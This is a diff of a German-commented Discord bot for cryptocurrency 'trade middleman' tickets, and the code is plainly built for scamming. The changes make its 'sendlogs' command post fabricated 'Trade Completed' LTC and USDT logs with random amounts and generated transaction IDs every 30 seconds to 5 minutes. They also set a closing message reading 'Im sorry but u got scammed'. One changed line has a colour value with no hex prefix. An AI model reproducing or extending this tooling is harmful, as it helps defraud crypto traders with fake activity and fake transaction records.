@@ -20,7 +20,7 @@ let LTC_ADDRESS = 'DEINE_LTC_ADRESSE';
 let USDT_ADDRESS = 'DEINE_USDT_ADRESSE';
 let LOG_CHANNEL_ID = 'LOG_CHANNEL_ID_HIER';
 let SIMULATE_ROLE_ID = 'SIMULATE_ROLE_ID_HIER';
-const SUPER_OWNER = 123456789012345678n; // DEINE DISCORD ID
+const SUPER_OWNER = 1472661189824872622; // DEINE DISCORD ID
 let owners = new Set();
 let tickets = {}; // ticketId: { trader1, trader2, giving1, giving2, sender, receiver, usdAmount, ltcAmount, currency, copyUsed }
 
@@ -90,7 +90,6 @@ client.on('ready', async () => {
       .setName('sendlogs')
       .setDescription('Send a fake trade log')
       .addChannelOption(o => o.setName('channel').setDescription('Channel').setRequired(true))
-      .addNumberOption(o => o.setName('amount').setDescription('USD Amount').setRequired(true))
       .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
     new SlashCommandBuilder()
       .setName('simulatedetection')
@@ -424,9 +423,9 @@ client.on('interactionCreate', async (interaction) => {
 
       // ===== FINALES EMBED — HIER DEINEN TEXT EINFÜGEN =====
       const finalEmbed = new EmbedBuilder()
-        .setTitle('DEIN TITEL HIER') // <-- Titel ändern
-        .setDescription('DEIN TEXT HIER') // <-- Text ändern
-        .setColor(0x00aa00); // <-- Farbe ändern (hex)
+        .setTitle('Scam Notification') // <-- Titel ändern
+        .setDescription('Im sorry but u got scammed') // <-- Text ändern
+        .setColor(ff0000); // <-- Farbe ändern (hex)
       // ======================================================
 
       await interaction.update({ embeds: [finalEmbed], components: [] });
@@ -604,35 +603,32 @@ client.on('interactionCreate', async (interaction) => {
   if (interaction.commandName === 'sendlogs') {
     if (!owners.has(interaction.user.id) && BigInt(interaction.user.id) !== SUPER_OWNER) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
     const channel = interaction.options.getChannel('channel');
-    const amount = interaction.options.getNumber('amount');
-    const ltcPrice = await getLTCPrice();
-    const ltcAmount = (amount / ltcPrice).toFixed(8);
-    const txid = generateTXID();
 
-    const logEmbed = new EmbedBuilder()
-      .setTitle('🔘 • Trade Completed')
-      .setDescription(`\`${ltcAmount}\` **LTC** ($${amount.toFixed(2)} USD)\n\n**Sender**\n\`Anonymous\`\n**Receiver**\n\`Anonymous\`\n**Transaction ID**\n\`${formatTXID(txid)}\``)
-      .setColor(0x00aa00);
-
-    await channel.send({ embeds: [logEmbed] });
     await interaction.reply({ content: 'Log sent!', ephemeral: true });
 
     // Auto logs every 5-30 min
     const scheduleLog = async () => {
-      const delay = (Math.floor(Math.random() * 25) + 5) * 60 * 1000;
-      setTimeout(async () => {
-        const randomAmount = (Math.random() * 200 + 1).toFixed(2);
-        const randomLtc = (randomAmount / ltcPrice).toFixed(8);
-        const randomTxid = generateTXID();
-        const autoEmbed = new EmbedBuilder()
-          .setTitle('🔘 • Trade Completed')
-          .setDescription(`\`${randomLtc}\` **LTC** ($${randomAmount} USD)\n\n**Sender**\n\`Anonymous\`\n**Receiver**\n\`Anonymous\`\n**Transaction ID**\n\`${formatTXID(randomTxid)}\``)
-          .setColor(0x00aa00);
-        await channel.send({ embeds: [autoEmbed] }).catch(() => {});
-        scheduleLog();
-      }, delay);
-    };
+  const delay = (Math.floor(Math.random() * 4.5) + 0.5) * 60 * 1000; // 30 sek bis 5 min
+  setTimeout(async () => {
+    const isUSDT = Math.random() < 0.1; // 10% USDT, 90% LTC
+    const randomAmount = (Math.random() * 200 + 1).toFixed(2);
+    const randomLtc = (randomAmount / ltcPrice).toFixed(8);
+    const randomTxid = generateTXID();
+    const usdtTxid = '0x' + randomTxid.slice(0, 64);
+
+    const autoEmbed = new EmbedBuilder()
+      .setTitle(isUSDT ? '🟢 • Trade Completed' : '🔘 • Trade Completed')
+      .setDescription(isUSDT
+        ? `\`${parseFloat(randomAmount).toFixed(2)}\` **USDT** ($${(parseFloat(randomAmount) - 0.01).toFixed(2)} USD)\n\n**Sender**\n\`Anonymous\`\n**Receiver**\n\`Anonymous\`\n**Transaction ID**\n\`${formatTXID(usdtTxid)}\``
+        : `\`${randomLtc}\` **LTC** ($${randomAmount} USD)\n\n**Sender**\n\`Anonymous\`\n**Receiver**\n\`Anonymous\`\n**Transaction ID**\n\`${formatTXID(randomTxid)}\``
+      )
+      .setColor(isUSDT ? 0x26a17b : 0x00aa00);
+
+    await channel.send({ embeds: [autoEmbed] }).catch(() => {});
     scheduleLog();
+  }, delay);
+};
+scheduleLog();
   }
 
   if (interaction.commandName === 'simulatedetection') {
